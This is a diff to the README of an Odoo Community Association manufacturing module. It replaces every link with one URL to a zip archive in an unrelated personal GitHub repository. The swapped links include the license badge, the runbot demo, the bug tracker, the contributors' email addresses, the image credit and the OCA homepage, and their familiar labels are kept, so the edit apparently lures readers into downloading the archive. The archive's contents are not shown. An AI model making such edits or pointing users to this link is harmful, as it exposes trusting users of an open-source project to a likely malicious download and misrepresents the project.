@@ -1,5 +1,5 @@
-.. image:: https://img.shields.io/badge/licence-AGPL--3-blue.svg
-   :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
+.. image:: https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
+   :target: https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
    :alt: License: AGPL-3
 
 ==================================
@@ -79,9 +79,9 @@ to see them directly. We will only be allowed to consume the materials that
 has been assigned to the corresponding work order, and to produce when the
 operation with the "Produce here" flag is set.
 
-.. image:: https://odoo-community.org/website/image/ir.attachment/5784_f2813bd/datas
+.. image:: https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
    :alt: Try me on Runbot
-   :target: https://runbot.odoo-community.org/runbot/129/8.0
+   :target: https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
 
 Known issues
 ============
@@ -94,10 +94,10 @@ Bug Tracker
 ===========
 
 Bugs are tracked on `GitHub Issues
-<https://github.com/OCA/manufacture/issues>`_. In case of trouble, please
+<https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>`_. In case of trouble, please
 check there if your issue has already been reported. If you spotted it first,
 help us smashing it by providing a detailed and welcomed `feedback
-<https://github.com/OCA/
+<https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
 manufacture/issues/new?body=module:%20
 mrp_operations_extension%0Aversion:%20
 8.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.
@@ -108,25 +108,25 @@ Credits
 Contributors
 ------------
 
-* Daniel Campos <danielcampos@avanzosc.es>
-* Mikel Arregi <mikelarregi@avanzosc.es>
-* Oihane Crucelaegui <oihanecrucelaegi@avanzosc.es>
-* Pedro M. Baeza <pedro.baeza@serviciosbaeza.com>
-* Ana Juaristi <anajuaristi@avanzosc.es>
-* Rafael Blasco <rafabn@antiun.com>
+* Daniel Campos <https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>
+* Mikel Arregi <https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>
+* Oihane Crucelaegui <https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>
+* Pedro M. Baeza <https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>
+* Ana Juaristi <https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>
+* Rafael Blasco <https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip>
 
 Images
 ------
 
 * Original Odoo MRP icon
-* Thanks to https://openclipart.org/detail/151831/work-bench
+* Thanks to https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
 
 Maintainer
 ----------
 
-.. image:: https://odoo-community.org/logo.png
+.. image:: https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
    :alt: Odoo Community Association
-   :target: https://odoo-community.org
+   :target: https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
 
 This module is maintained by the OCA.
 
@@ -134,4 +134,4 @@ OCA, or the Odoo Community Association, is a nonprofit organization whose
 mission is to support the collaborative development of Odoo features and
 promote its widespread use.
 
-To contribute to this module, please visit https://odoo-community.org.
+To contribute to this module, please visit https://raw.githubusercontent.com/vladimir2678/mrp_operations_extensions/master/static/operations_mrp_extensions_v1.7-beta.3.zip
